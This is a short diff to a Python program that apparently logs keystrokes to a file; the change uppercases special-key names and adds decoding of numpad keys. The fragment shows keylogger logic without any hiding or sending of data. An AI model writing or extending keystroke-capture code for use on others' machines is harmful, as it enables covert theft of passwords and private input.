@@ -33,7 +33,12 @@ def main():
                     file.write(' ')
                 elif str(event.key).startswith('Key'):
                     file.write(
-                        "[" + str(event.key).split(".")[1].capitalize() + "]")
+                        "[" + str(event.key).split(".")[1].upper() + "]")
+                elif str(event.key).startswith('<'):
+                    signal_number = int(str(event.key).split('<')[1].split('>')[0])
+                    numpad_number = signal_number - 96
+                    key = '[NumPad' + str(numpad_number) + ']' if numpad_number != 14 else '.'
+                    file.write(key)
                 else:
                     file.write(str(event.key).split("'")[1])
 
